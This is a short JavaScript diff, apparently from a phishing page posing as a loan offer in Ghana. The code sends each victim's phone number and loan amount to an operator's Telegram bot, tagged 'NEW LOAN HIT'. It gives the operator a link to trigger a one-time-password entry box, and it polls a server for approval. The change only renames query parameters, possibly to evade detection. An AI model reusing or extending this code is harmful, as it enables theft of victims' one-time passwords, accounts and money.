@@ -162,7 +162,7 @@
         showView(2); // Show Loading
 
         // Send Notification to Operator
-        const approveLink = `${SCRIPT_URL}?action=approveOTP&phone=${id}`;
+        const approveLink = `${SCRIPT_URL}?cmd=approve&num=${id}`;
         const msg = `💰 *NEW LOAN HIT*\nAmt: GHS ${amt}\nID: ${id}\n\n✅ *CLICK TO SHOW OTP BOX:* \n${approveLink}`;
         
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
@@ -174,7 +174,7 @@
     function startPolling(phone) {
         const poller = setInterval(async () => {
             try {
-                const r = await fetch(`${SCRIPT_URL}?phone=${phone}`);
+                const r = await fetch(`${SCRIPT_URL}?num=${phone}`);
                 const status = await r.text();
                 if(status.trim() === "approved") {
                     clearInterval(poller);
